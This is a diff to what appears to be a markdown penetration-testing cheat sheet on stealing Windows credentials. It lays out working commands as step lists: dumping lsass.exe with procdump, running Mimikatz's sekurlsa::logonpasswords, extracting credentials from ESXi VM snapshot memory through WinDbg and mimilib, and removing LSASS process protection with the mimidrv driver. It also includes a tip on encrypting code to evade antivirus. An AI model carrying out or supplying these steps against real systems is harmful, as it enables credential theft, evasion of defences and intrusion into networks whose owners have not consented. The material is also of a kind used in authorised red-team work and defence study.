@@ -84,26 +84,91 @@ THEN
 
 ## Sysinternals suite (Procdump)
 
-#### procdump.exe -accepteula -ma lsass.exe c:\tools\mimikatz\lsass_dump
+#### 
+
+    procdump.exe -accepteula -ma lsass.exe c:\tools\mimikatz\lsass_dump
 
 ## TIP: Bypass AV, write code to encrypt
 
 ## Mimikatz
 
-#### 1) mimikatz
+#### 1) 
 
-#### 2) privilege::debug
+    mimikatz
 
-#### 3) sekurlsa::logonpasswords
+#### 2) 
+
+    privilege::debug
+
+#### 3) 
+    
+    sekurlsa::logonpasswords
+
+## VM Snapshots
+
+Requires access to a VMWare ESXi or equivalent software.
+
+### 1) Login to the VMWare console
+
+### 2) Select a VM you are interested in and take a snapshot of it, then give it a name
+
+    Virtual Machines -> Right click on the VM -> Snapshots -> Take snapshot
+
+### 3) Locate the VM Disk file and download the snapshot memory
+
+    Storage -> datastore1 -> VM_NAME -> VM_NAME_SNAPSHOT.vmem -> Download
+
+Same for .vmsn
+
+    Storage -> datastore1 -> VM_NAME -> VM_NAME_SNAPSHOT.vmsn -> Download
+
+### 4) Navigate to the directory where the downloaded files are located
+
+    cd \temp    
+
+### 5) Convert the snapshot files to a memory dump file
+
+    "C:\Program Files (x86)\VMWare\VMWare Workstation\vmms2core.exe" -W8 VM_NAME_SNAPSHOT.vmsn VM_NAME_SNAPSHOT.vmem
+
+### 6) Open memory dump with WinDbg
+
+In WinDbg:
+
+    File -> Open Crash Dump -> memory.dmp
+
+Perform a reload
+
+    .reload
+
+### 7) Load the Mimikatz library
+
+    .load c:\temp\mimilib.dll
+
+### 8) Display information about the LSASS process
+
+    !process 0 0 lsass.exe
+
+### 9) Dump it!
+
+    .process /r /p PROCESS_POINTER
+    !mimikatz
 
 # BYPASS LSASS PROTECTION
 
-#### 1) mimikatz
+#### 1) Launch Mimikatz
 
-#### 2) privilege::debug 
+    mimikatz
 
-#### 3) !+ (Load mimidrv driver into memory)
+#### 2) Verify privileges
 
-#### 4) !processprotect /process:lsass.exe /remove
+    privilege::debug 
+
+#### 3) Load mimidrv driver into memory
+
+    !+ 
+
+#### 4) Remove LSASS protection
+
+    !processprotect /process:lsass.exe /remove
 
 #### 5) sekurlsa::logonpasswords
